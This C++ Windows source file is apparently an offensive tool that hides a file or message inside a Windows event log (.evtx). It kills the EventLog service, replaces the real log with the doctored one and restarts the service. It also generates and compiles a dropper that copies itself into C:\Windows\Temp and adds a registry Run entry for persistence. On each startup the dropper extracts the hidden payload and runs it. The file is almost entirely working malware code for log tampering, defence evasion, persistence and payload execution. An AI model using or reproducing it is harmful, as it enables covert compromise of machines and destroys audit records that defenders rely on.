#include <iostream>
#include <string>
#include <cstdlib>
#include <optional>
#include <vector>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <fstream>
#include <filesystem>
#include <regex>
#include <array>
#include <thread>
#include <algorithm>

namespace fs = std::filesystem;

// Function for escaping backslash in generated executable
std::string escapeBackslashes(const std::string& path) {
    std::string escapedPath;
    for (char ch : path) {
        if (ch == '\\') {
            escapedPath += "\\\\";
        }
        else {
            escapedPath += ch;
        }
    }
    return escapedPath;
}

// Function to run EVTXTool.exe with mutually exclusive flags -f and -m
bool runEVTXTool(const std::string& inputFile, const std::string& outputFile,
    const std::optional<std::string>& filePath, const std::optional<std::string>& directInput) {

    if (filePath.has_value() && directInput.has_value()) {
        std::cerr << "Error: -f and -m options are cannot be specified together. Specify only one." << std::endl;
        return false;
    }

    // Construct the command string
    std::string command = "EVTXTool.exe -e -i \"" + inputFile + "\" -o \"" + outputFile + "\"";

    if (filePath.has_value()) {
        command += " -f \"" + filePath.value() + "\"";
    }
    else if (directInput.has_value()) {
        command += " -m \"" + directInput.value() + "\"";
    }
    else {
        std::cerr << "Error: Either -f or -m must be specified." << std::endl;
        return false;
    }

    // std::cout << "Executing command: " << command << std::endl;

    // Run the command using the system function
    int result = system(command.c_str());

    // Return true if the command executed successfully
    return (result == 0);
}

// Function to find the PID of a input service name
std::optional<DWORD> getServicePID(const std::wstring& serviceName) {
    // Take a snapshot of all processes in the system
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Error: Unable to create process snapshot." << std::endl;
        return std::nullopt;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if (!Process32First(hProcessSnap, &pe32)) {
        std::cerr << "Error: Unable to get first process." << std::endl;
        CloseHandle(hProcessSnap);
        return std::nullopt;
    }

    DWORD targetPID = 0;
    do {
        SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
        if (hSCManager) {
            DWORD bytesNeeded = 0, servicesReturned = 0, resumeHandle = 0;
            ENUM_SERVICE_STATUS_PROCESS* services = nullptr;

            // Query the services to determine required buffer size
            EnumServicesStatusEx(
                hSCManager,
                SC_ENUM_PROCESS_INFO,
                SERVICE_WIN32,
                SERVICE_ACTIVE,
                NULL,
                0,
                &bytesNeeded,
                &servicesReturned,
                &resumeHandle,
                NULL
            );

            // Allocate the necessary buffer
            services = (ENUM_SERVICE_STATUS_PROCESS*)malloc(bytesNeeded);
            if (services == nullptr) {
                std::cerr << "Error: Memory allocation failed." << std::endl;
                CloseServiceHandle(hSCManager);
                CloseHandle(hProcessSnap);
                return std::nullopt;
            }

            if (EnumServicesStatusEx(
                hSCManager,
                SC_ENUM_PROCESS_INFO,
                SERVICE_WIN32,
                SERVICE_ACTIVE,
                (LPBYTE)services,
                bytesNeeded,
                &bytesNeeded,
                &servicesReturned,
                &resumeHandle,
                NULL
            )) {
                for (DWORD i = 0; i < servicesReturned; i++) {
                    if (serviceName == services[i].lpServiceName) {
                        targetPID = services[i].ServiceStatusProcess.dwProcessId;
                        free(services);
                        CloseServiceHandle(hSCManager);
                        CloseHandle(hProcessSnap);
                        return targetPID; // Found PID
                    }
                }
            }

            free(services);
            CloseServiceHandle(hSCManager);
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return std::nullopt; // Service not found
}

// Function to kill Process by PID
bool killProcessByPID(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        std::cerr << "Error: Unable to open process with PID " << pid << ". Error code: " << GetLastError() << std::endl;
        return false;
    }

    // Terminate the process
    if (!TerminateProcess(hProcess, 1)) {
        std::cerr << "Error: Unable to terminate process with PID " << pid << ". Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hProcess);
    std::cout << "Successfully terminated process with PID " << pid << "." << std::endl;
    return true;
}

// Function to read the first 8 bytes of a file and check its signature
bool isEvtxFile(const std::string& filePath) {
    const std::vector<unsigned char> evtxSignature = { 0x45, 0x6C, 0x66, 0x46, 0x69, 0x6C, 0x65, 0x00 };
    std::ifstream file(filePath, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error: Could not open file at " << filePath << std::endl;
        return false;
    }

    std::vector<unsigned char> buffer(8);
    file.read(reinterpret_cast<char*>(buffer.data()), static_cast<std::streamsize>(buffer.size()));
    file.close();

    return buffer == evtxSignature;
}

// Function to delete a file if it is a valid .evtx file
bool deleteEvtxFile(const std::string& filePath) {
    namespace fs = std::filesystem;

    // Check if the file exists
    if (!fs::exists(filePath)) {
        std::cerr << "Error: File does not exist at " << filePath << std::endl;
        return false;
    }

    // Check if the file has the correct .evtx extension
    if (fs::path(filePath).extension() != ".evtx") {
        std::cerr << "Error: File is not a .evtx file: " << filePath << std::endl;
        return false;
    }

    // Check the magic number
    if (!isEvtxFile(filePath)) {
        std::cerr << "Error: File at " << filePath << " does not have a valid .evtx signature." << std::endl;
        return false;
    }

    // Attempt to delete the file
    try {
        if (fs::remove(filePath)) {
            std::cout << "File deleted successfully: " << filePath << std::endl;
            return true;
        }
        else {
            std::cerr << "Error: Failed to delete file at " << filePath << std::endl;
            return false;
        }
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        return false;
    }
}

// Function to copy a file if it is a valid .evtx file
bool copyEvtxFile(const std::string& inputFilePath, const std::string& targetFilePath) {
    namespace fs = std::filesystem;

    // Check if the input file exists
    if (!fs::exists(inputFilePath)) {
        std::cerr << "Error: Input file does not exist at " << inputFilePath << std::endl;
        return false;
    }

    // Check if the input file has the correct .evtx extension
    if (fs::path(inputFilePath).extension() != ".evtx") {
        std::cerr << "Error: Input file is not a .evtx file: " << inputFilePath << std::endl;
        return false;
    }

    // Validate the input file's signature
    if (!isEvtxFile(inputFilePath)) {
        std::cerr << "Error: Input file at " << inputFilePath << " does not have a valid .evtx signature." << std::endl;
        return false;
    }

    // Attempt to copy the file
    try {
        fs::copy_file(inputFilePath, targetFilePath, fs::copy_options::overwrite_existing);
        std::cout << "File copied successfully from " << inputFilePath << " to " << targetFilePath << std::endl;
        return true;
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        return false;
    }
}

bool startService(const std::string& serviceName) {
    std::wstring wServiceName(serviceName.begin(), serviceName.end());

    // Open a handle to the Service Control Manager
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        std::cerr << "Error: Unable to open Service Control Manager. Error code: " << GetLastError() << std::endl;
        return false;
    }

    // Open a handle to the service
    SC_HANDLE hService = OpenService(hSCManager, wServiceName.c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        std::cerr << "Error: Unable to open service " << serviceName << ". Error code: " << GetLastError() << std::endl;
        CloseServiceHandle(hSCManager);
        return false;
    }

    // Start the service
    if (!StartService(hService, 0, NULL)) {
        DWORD errorCode = GetLastError();
        if (errorCode == ERROR_SERVICE_ALREADY_RUNNING) {
            std::cout << "Service " << serviceName << " is already running." << std::endl;
        }
        else {
            std::cerr << "Error: Unable to start service " << serviceName << ". Error code: " << errorCode << std::endl;
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return false;
        }
    }
    else {
        std::cout << "Service " << serviceName << " started successfully." << std::endl;
    }

    // Clean up handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

// Utility function to embed files
std::string embedFile(const std::string& filePath) {
    std::ostringstream oss;
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        throw std::runtime_error("Unable to open file for embedding: " + filePath);
    }

    oss << std::hex;
    char byte;
    while (file.get(byte)) {
        oss << "0x" << (static_cast<unsigned>(byte) & 0xFF) << ", ";
    }
    return oss.str();
}

// Function to extract embedded resources
void extractEmbeddedResource(const std::vector<unsigned char>& data, const std::string& outputPath) {
    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile.is_open()) {
        throw std::runtime_error("Error: Could not extract resource to " + outputPath);
    }
    outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
}

// Function to generate the executable
bool generateExecutable(const std::string& outputExePath, const std::string& targetEVTXPath,
    const std::optional<std::string>& encodeFilePath, const std::optional<std::string>& encodeMessage,
    const std::string& embeddedEVTXToolPath) {
    std::ostringstream cppFile;

    std::string escapedTargetEVTXPath = escapeBackslashes(targetEVTXPath);

    cppFile << R"(#include <iostream>
#include <string>
#include <cstdlib>
#include <optional>
#include <vector>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <fstream>
#include <filesystem>
#include <regex>
#include <array>
#include <thread>

// Function prototypes
bool runEVTXTool(const std::string& exePath, const std::string& inputFile, const std::string& outputFile,
                 const std::optional<std::string>& filePath, const std::optional<std::string>& directInput) {
    // Ensure only one of filePath or directInput is provided
    if (filePath.has_value() && directInput.has_value()) {
        std::cerr << "Error: -f and -m options are mutually exclusive. Specify only one." << std::endl;
        return false;
    }

    // Verify exePath is not empty
    if (exePath.empty()) {
        std::cerr << "Error: Path to EVTXTool.exe is empty." << std::endl;
        return false;
    }

    // Construct the command string
    std::ostringstream command;
    command << "cmd /c \"" << exePath << " -e -i \"" << inputFile << "\" -o \"" << outputFile << "\"";

    if (filePath.has_value()) {
        command << " -f \"" << filePath.value() << "\"";
    } else if (directInput.has_value()) {
        command << " -m \"" << directInput.value() << "\"";
    } else {
        std::cerr << "Error: Either -f or -m must be specified." << std::endl;
        return false;
    }

    command << " -s 27 -s 28";

    command << "\"";

    // Print the command for debugging
    std::string finalCommand = command.str();
    // std::cout << "Executing command: " << finalCommand << std::endl;

    // Write the command to a debug file
    // std::ofstream debugFile("debug_command.txt");
    // debugFile << finalCommand;
    // debugFile.close();

    // Run the command using the system function
    int result = system(finalCommand.c_str());

    // Return true if the command executed successfully
    return (result == 0);
}


// Function to find the PID of a given service name
std::optional<DWORD> getServicePID(const std::wstring& serviceName) {
    // Open a handle to the Service Control Manager
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCManager) {
        std::cerr << "Error: Unable to open Service Control Manager. Error code: " << GetLastError() << std::endl;
        return std::nullopt;
    }

    DWORD bytesNeeded = 0, servicesReturned = 0, resumeHandle = 0;

    // Query the buffer size for services enumeration
    EnumServicesStatusExW(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_ACTIVE,
        NULL,
        0,
        &bytesNeeded,
        &servicesReturned,
        &resumeHandle,
        NULL
    );

    std::vector<BYTE> buffer(bytesNeeded);
    auto services = reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSW*>(buffer.data());

    // Enumerate the services
    if (!EnumServicesStatusExW(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_ACTIVE,
        buffer.data(),
        bytesNeeded,
        &bytesNeeded,
        &servicesReturned,
        &resumeHandle,
        NULL
    )) {
        std::cerr << "Error: Failed to enumerate services. Error code: " << GetLastError() << std::endl;
        CloseServiceHandle(hSCManager);
        return std::nullopt;
    }

    for (DWORD i = 0; i < servicesReturned; ++i) {
        if (serviceName == services[i].lpServiceName) {
            DWORD pid = services[i].ServiceStatusProcess.dwProcessId;
            CloseServiceHandle(hSCManager);
            return pid;
        }
    }

    CloseServiceHandle(hSCManager);
    return std::nullopt;
}

bool killProcessByPID(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        std::cerr << "Error: Unable to open process with PID " << pid << ". Error code: " << GetLastError() << std::endl;
        return false;
    }

    // Terminate the process
    if (!TerminateProcess(hProcess, 1)) {
        std::cerr << "Error: Unable to terminate process with PID " << pid << ". Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hProcess);
    std::cout << "Successfully terminated process with PID " << pid << "." << std::endl;
    return true;
}

// Function to read the first 8 bytes of a file and check its signature
bool isEvtxFile(const std::string& filePath) {
    const std::vector<unsigned char> evtxSignature = { 0x45, 0x6C, 0x66, 0x46, 0x69, 0x6C, 0x65, 0x00 };
    std::ifstream file(filePath, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error: Could not open file at " << filePath << std::endl;
        return false;
    }

    std::vector<unsigned char> buffer(8);
    file.read(reinterpret_cast<char*>(buffer.data()), static_cast<std::streamsize>(buffer.size()));
    file.close();

    return buffer == evtxSignature;
}

// Function to delete a file if it is a valid .evtx file
bool deleteEvtxFile(const std::string& filePath) {
    namespace fs = std::filesystem;

    // Check if the file exists
    if (!fs::exists(filePath)) {
        std::cerr << "Error: File does not exist at " << filePath << std::endl;
        return false;
    }

    // Check if the file has the correct .evtx extension
    if (fs::path(filePath).extension() != ".evtx") {
        std::cerr << "Error: File is not a .evtx file: " << filePath << std::endl;
        return false;
    }

    // Check the magic number
    if (!isEvtxFile(filePath)) {
        std::cerr << "Error: File at " << filePath << " does not have a valid .evtx signature." << std::endl;
        return false;
    }

    // Attempt to delete the file
    try {
        if (fs::remove(filePath)) {
            std::cout << "File deleted successfully: " << filePath << std::endl;
            return true;
        }
        else {
            std::cerr << "Error: Failed to delete file at " << filePath << std::endl;
            return false;
        }
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        return false;
    }
}

// Function to copy a file if it is a valid .evtx file
bool copyEvtxFile(const std::string& inputFilePath, const std::string& targetFilePath) {
    namespace fs = std::filesystem;

    // Check if the input file exists
    if (!fs::exists(inputFilePath)) {
        std::cerr << "Error: Input file does not exist at " << inputFilePath << std::endl;
        return false;
    }

    // Check if the input file has the correct .evtx extension
    if (fs::path(inputFilePath).extension() != ".evtx") {
        std::cerr << "Error: Input file is not a .evtx file: " << inputFilePath << std::endl;
        return false;
    }

    // Validate the input file's signature
    if (!isEvtxFile(inputFilePath)) {
        std::cerr << "Error: Input file at " << inputFilePath << " does not have a valid .evtx signature." << std::endl;
        return false;
    }

    // Attempt to copy the file
    try {
        fs::copy_file(inputFilePath, targetFilePath, fs::copy_options::overwrite_existing);
        std::cout << "File copied successfully from " << inputFilePath << " to " << targetFilePath << std::endl;
        return true;
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        return false;
    }
}

bool startService(const std::string& serviceName) {
    // Convert service name to wide string
    std::wstring wServiceName(serviceName.begin(), serviceName.end());

    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        std::cerr << "Error: Unable to open Service Control Manager. Error code: " << GetLastError() << std::endl;
        return false;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, wServiceName.c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        std::cerr << "Error: Unable to open service. Error code: " << GetLastError() << std::endl;
        CloseServiceHandle(hSCManager);
        return false;
    }

    bool success = StartServiceW(hService, 0, NULL) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;

    if (!success) {
        std::cerr << "Error: Failed to start service. Error code: " << GetLastError() << std::endl;
    } else {
        std::cout << "Service started successfully." << std::endl;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return success;
}

// Function to extract embedded resources
void extractEmbeddedResource(const std::vector<unsigned char>& data, const std::string& outputPath) {
    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile.is_open()) {
        std::cerr << "Error: Could not extract resource to " << outputPath << std::endl;
        exit(1);
    }
    outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
    outFile.close();
}

// Function to check if a file has an MZ header
bool isExecutable(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Error: Could not open file at " << filePath << std::endl;
        return false;
    }

    char mzHeader[2];
    file.read(mzHeader, 2);
    file.close();

    return mzHeader[0] == 'M' && mzHeader[1] == 'Z';
}

// Copy forcefully from source to target
void copyForcefully(const std::string& sourcePath, const std::string& targetPath) {
    try {
        // Copy the file and overwrite if it already exists
        std::filesystem::copy_file(sourcePath, targetPath, std::filesystem::copy_options::overwrite_existing);
        std::cout << "File copied successfully from " << sourcePath << " to " << targetPath << std::endl;
    } catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        exit(1);
    }
}

// Function to add executable to the registry for startup
void addToRunOnStartup(const std::string& exePathWithFlags) {
    HKEY hKey;
    std::string registryPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, registryPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExA(hKey, "MyStartupApp", 0, REG_SZ, (const BYTE*)exePathWithFlags.c_str(),
                           exePathWithFlags.size() + 1) == ERROR_SUCCESS) {
            std::cout << "Successfully added to startup: " << exePathWithFlags << std::endl;
        } else {
            std::cerr << "Error: Failed to set registry value for startup." << std::endl;
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Error: Failed to open registry key for startup. Ensure you have admin rights." << std::endl;
    }
}

// Embedded EVTXTool data
const std::vector<unsigned char> embeddedEVTXTool = {)";

    // Embed the EVTXTool.exe
    std::ifstream evtxTool(embeddedEVTXToolPath, std::ios::binary);
    if (!evtxTool.is_open()) {
        std::cerr << "Error: Unable to open EVTXTool.exe for embedding." << std::endl;
        return false;
    }
    cppFile << std::hex;
    char byte;
    while (evtxTool.get(byte)) {
        cppFile << "0x" << (static_cast<unsigned>(byte) & 0xFF) << ", ";
    }
    evtxTool.close();

    cppFile << R"(};

// Embedded file or message data)";
    if (encodeFilePath.has_value()) {
        cppFile << R"(
const std::vector<unsigned char> embeddedFile = {)";
        std::ifstream file(encodeFilePath.value(), std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "Error: Unable to open file for embedding: " << encodeFilePath.value() << std::endl;
            return false;
        }
        while (file.get(byte)) {
            cppFile << "0x" << (static_cast<unsigned>(byte) & 0xFF) << ", ";
        }
        file.close();
        cppFile << "};";
    }
    else if (encodeMessage.has_value()) {
        cppFile << R"(
const std::string embeddedMessage = ")" << encodeMessage.value() << R"(";)";
    }

    cppFile << R"(

// Hardcoded target EVTX path
const std::string targetEVTXPath = ")" << escapedTargetEVTXPath << R"(";

int main(int argc, char* argv[]) {
    const std::string tempEncodedFilePath = "C:\\Windows\\Temp\\encoded.evtx";
    const std::string tempEVTXToolPath = "C:\\Windows\\Temp\\EVTXTool.exe";
    const std::string tempEmbeddedFilePath = "C:\\Windows\\Temp\\toEncode.txt";
    const std::string decodedOutputPath = "C:\\Windows\\Temp\\decoded_output";
    const std::string tempExecutablePath = "C:\\Windows\\Temp\\run.exe";

    // Extract EVTXTool
    extractEmbeddedResource(embeddedEVTXTool, tempEVTXToolPath);

    // Extract the file to encode if using a file
)";
    if (encodeFilePath.has_value()) {
        cppFile << R"(
    extractEmbeddedResource(embeddedFile, tempEmbeddedFilePath);
)";
    }

    cppFile << R"(
        // Check if -d flag is present
    bool decodeMode = false;
    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "-d") {
            decodeMode = true;
            break;
        }
    }

    if (decodeMode) {
        // Run the decode command
        std::ostringstream command;
        command << "cmd /c \"" << tempEVTXToolPath << " -d -i \"" << targetEVTXPath
                << "\" -o \"" << decodedOutputPath << "\"\"";
        std::cout << "Executing command: " << command.str() << std::endl;

        if (system(command.str().c_str()) != 0) {
            std::cerr << "Error: Decoding failed." << std::endl;
            return 1;
        }

        // Check if the decoded file is an executable
        if (isExecutable(decodedOutputPath)) {
            std::string executablePath = decodedOutputPath + ".exe";
            std::filesystem::rename(decodedOutputPath, executablePath);

            // Execute the file silently
            std::cout << "Executing decoded file: " << executablePath << std::endl;
            system(executablePath.c_str());
        } else {
            std::cerr << "Decoded file is not executable." << std::endl;
        }

        return 0;
    }
)";

    cppFile << R"(
    // Run EVTXTool
    if (!runEVTXTool(tempEVTXToolPath, targetEVTXPath, tempEncodedFilePath, )";

    if (encodeFilePath.has_value()) {
        cppFile << "std::optional<std::string>(tempEmbeddedFilePath), std::nullopt";
    }
    else if (encodeMessage.has_value()) {
        cppFile << "std::nullopt, std::optional<std::string>(embeddedMessage)";
    }
    else {
        cppFile << "std::nullopt, std::nullopt";
    }

    cppFile << R"()) {
        std::cerr << "Error: Encoding failed." << std::endl;
        return 1;
    }

    // Manage EventLog process
    auto eventLogPID = getServicePID(L"EventLog");
    if (!eventLogPID.has_value() || !killProcessByPID(eventLogPID.value())) {
        std::cerr << "Error: Failed to terminate EventLog process." << std::endl;
        return 1;
    }

    std::this_thread::sleep_for(std::chrono::seconds(2));

    if (!deleteEvtxFile(targetEVTXPath)) {
        std::cerr << "Error: Could not delete target EVTX file." << std::endl;
        return 1;
    }

    if (!copyEvtxFile(tempEncodedFilePath, targetEVTXPath)) {
        std::cerr << "Error: Could not replace target EVTX file." << std::endl;
        return 1;
    }

    if (!startService("EventLog")) {
        std::cerr << "Error: Failed to restart EventLog service." << std::endl;
        return 1;
    }

    // Copy the current executable to temp for startup
    char currentExecutablePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentExecutablePath, MAX_PATH);
    copyForcefully(currentExecutablePath, tempExecutablePath);

    // Add to startup
    addToRunOnStartup(tempExecutablePath + " -d");

    std::cout << "Operation completed successfully." << std::endl;
    return 0;
}
)";

    // Write the generated source code to a temporary .cpp file
    std::string tempCppFile = "temp_generated.cpp";
    std::ofstream outCpp(tempCppFile);
    if (!outCpp.is_open()) {
        std::cerr << "Error: Unable to write generated source file." << std::endl;
        return false;
    }
    outCpp << cppFile.str();
    outCpp.close();

    // Compile the source code into an executable
    std::string compileCommand = "g++ -fpermissive -o " + outputExePath + " " + tempCppFile;
    int compileResult = system(compileCommand.c_str());
    if (compileResult != 0) {
        std::cerr << "Error: Compilation failed." << std::endl;
        return false;
    }

    // Clean up temporary files
    std::filesystem::remove(tempCppFile);

    std::cout << "Executable generated successfully: " << outputExePath << std::endl;
    return true;
}

int main(int argc, char* argv[]) {
    // Variables to hold command-line arguments
    std::string targetFile;
    std::optional<std::string> filePath;
    std::optional<std::string> directInput;
    std::optional<std::string> outputExePath; // Path for the generated executable
    std::string tempOutputPath = "C:\\Windows\\Temp\\encoded.evtx"; // Temporary output file

    // Parse command-line arguments
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];

        if (arg == "-t" && i + 1 < argc) {
            targetFile = argv[++i];
        }
        else if (arg == "-f" && i + 1 < argc) {
            filePath = argv[++i];
        }
        else if (arg == "-m" && i + 1 < argc) {
            directInput = argv[++i];
        }
        else if (arg == "--executable" || arg == "-E") {
            if (i + 1 < argc) {
                outputExePath = argv[++i];
            }
            else {
                std::cerr << "Error: Missing value for --executable/-E option." << std::endl;
                return 1;
            }
        }
        else {
            std::cerr << "Error: Invalid argument or missing value for " << arg << std::endl;
            return 1;
        }
    }

    // Validate mutually exclusive flags
    if (filePath.has_value() && directInput.has_value()) {
        std::cerr << "Error: -f and -m options are mutually exclusive. Specify only one." << std::endl;
        return 1;
    }

    // If --executable is specified, generate the self-contained executable
    if (outputExePath.has_value()) {
        if (!filePath.has_value()) {
            std::cerr << "Error: --executable requires -f (file to embed)." << std::endl;
            return 1;
        }

        // Validate the file to encode exists
        if (!std::filesystem::exists(filePath.value())) {
            std::cerr << "Error: File to encode does not exist: " << filePath.value() << std::endl;
            return 1;
        }

        // Validate that EVTXTool.exe exists in the current directory
        std::string evtxToolPath = "./EVTXTool.exe";
        if (!std::filesystem::exists(evtxToolPath)) {
            std::cerr << "Error: EVTXTool.exe not found in the current directory." << std::endl;
            return 1;
        }

        // Generate the executable
        if (!generateExecutable(outputExePath.value(), targetFile, filePath.value(), std::nullopt, evtxToolPath)) {
            std::cerr << "Error: Failed to generate the executable." << std::endl;
            return 1;
        }

        std::cout << "Executable generated successfully: " << outputExePath.value() << std::endl;
        return 0;
    }

    // Normal operation if not generating an executable
    if (targetFile.empty()) {
        std::cerr << "Error: Target file (-t) is required." << std::endl;
        return 1;
    }

    // Validate the target .evtx file
    if (!isEvtxFile(targetFile)) {
        std::cerr << "Error: The specified target file is not a valid .evtx file: " << targetFile << std::endl;
        return 1;
    }

    // Run EVTXTool.exe with the provided options
    if (!runEVTXTool(targetFile, tempOutputPath, filePath, directInput)) {
        std::cerr << "Error: Failed to execute EVTXTool." << std::endl;
        return 1;
    }

    std::cout << "Encoding completed successfully." << std::endl;

    // Manage the EventLog process and file operations
    std::wstring serviceName = L"EventLog";
    auto eventLogPID = getServicePID(serviceName);
    if (!eventLogPID.has_value()) {
        std::cerr << "Error: Could not find PID of EventLog service." << std::endl;
        return 1;
    }

    if (!killProcessByPID(eventLogPID.value())) {
        std::cerr << "Error: Could not terminate EventLog process." << std::endl;
        return 1;
    }

    std::this_thread::sleep_for(std::chrono::seconds(2));

    if (!deleteEvtxFile(targetFile)) {
        std::cerr << "Error: Could not delete the target .evtx file." << std::endl;
        return 1;
    }

    std::cout << "Target file deleted successfully: " << targetFile << std::endl;

    if (!copyEvtxFile(tempOutputPath, targetFile)) {
        std::cerr << "Error: Could not copy the encoded file to the target location." << std::endl;
        return 1;
    }

    std::cout << "Encoded file copied successfully to: " << targetFile << std::endl;

    if (!startService("EventLog")) {
        std::cerr << "Error: Could not restart the EventLog service." << std::endl;
        return 1;
    }

    std::cout << "EventLog service restarted successfully." << std::endl;
    return 0;
}
